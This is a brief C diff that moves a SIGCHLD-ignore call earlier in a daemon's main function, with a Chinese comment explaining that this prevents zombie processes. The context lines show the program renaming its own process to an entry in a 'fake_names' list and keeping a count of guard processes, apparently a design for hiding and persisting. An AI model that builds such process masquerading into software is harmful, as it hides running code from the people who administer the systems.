@@ -717,6 +717,7 @@ int main(int argc, char *argv[])
     }
 
     init_deamon();
+    signal(SIGCHLD, SIG_IGN);   /* 尽早设置，防止后续 fork 产生僵尸 */
 
     srand(getpid() ^ time(NULL));
 
@@ -749,7 +750,6 @@ int main(int argc, char *argv[])
     }
 
     ChangeProcessName(argv, fake_names[(NUM_GUARDS + 1) % NUM_FAKE_NAMES]);
-    signal(SIGCHLD, SIG_IGN);
     while (1)
     {
         usleep(15000);
